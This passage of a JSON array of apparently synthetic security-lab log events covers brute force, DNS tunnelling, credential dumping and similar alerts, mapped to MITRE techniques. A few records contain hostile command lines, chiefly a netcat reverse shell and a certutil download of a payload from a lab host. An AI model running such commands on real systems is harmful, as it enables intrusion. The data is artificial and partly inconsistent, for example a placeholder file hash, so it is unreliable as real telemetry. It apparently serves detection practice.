    "EventType": "Sysmon Registry Set",
    "Severity": "High",
    "EventCode": 13,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1547.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "rundll32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T05:25:37.667711",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T20:49:37.668445",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "91.234.56.78",
    "DestinationIP": "10.0.2.10",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T16:21:37.669456",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T19:09:37.669517",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T04:29:37.664286",
    "EventType": "Reverse Shell Detected",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1059.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Metasploit / Netcat"
  },
  {
    "TimeGenerated": "2026-04-22T09:59:37.667155",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T05:29:37.667575",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T12:55:37.663809",
    "EventType": "Sysmon Image Load",
    "Severity": "High",
    "EventCode": 7,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "wscript.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:58:37.667217",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T07:21:37.661658",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T03:59:37.665737",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "finance.user",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T18:39:37.669556",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T22:17:37.660399",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "KALI-LAB-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T18:53:37.666894",
    "EventType": "Data Exfiltration Suspected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": "svc.backup",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1048",
    "LogSource": "Firewall",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T14:46:37.660022",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "KALI-LAB-01",
    "SourceIP": "77.73.133.84",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T03:45:37.662524",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-24T11:24:37.660243",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T03:12:37.668617",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "194.165.16.11",
    "DestinationIP": "192.168.56.102",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T04:39:37.667254",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Meterpreter",
    "FileHash": "e10adc3949ba59abbe56e057f20f883e",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T17:04:37.669371",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T23:26:37.665348",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "finance.user",
    "Computer": "KALI-LAB-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T20:02:37.666571",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T02:21:37.660662",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "finance.user",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T15:25:37.666682",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T02:30:37.660184",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:55:37.659823",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "KALI-LAB-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T15:14:37.668756",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": "77.73.133.84",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T11:08:37.666745",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T08:10:37.663149",
    "EventType": "Password Spray",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T01:02:37.669302",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T01:40:37.666760",
    "EventType": "DNS Tunneling Detected",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1071.004",
    "LogSource": "DNS / Zeek",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T05:32:37.664765",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "john.doe",
    "Computer": "WAZUH-MANAGER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T22:37:37.660052",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "dev.engineer",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T10:08:37.662457",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "admin",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-19T18:24:37.660254",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T23:05:37.664833",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\\Windows\\Temp\\mal.exe",
    "ProcessName": "bitsadmin.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T02:54:37.662815",
    "EventType": "Kerberos TGS Request",
    "Severity": "High",
    "EventCode": 4769,
    "UserAccount": "jane.smith",
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1558.003",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T20:31:37.665840",
    "EventType": "PsExec Detected",
    "Severity": "High",
    "EventCode": 7045,
    "UserAccount": "finance.user",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1570",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
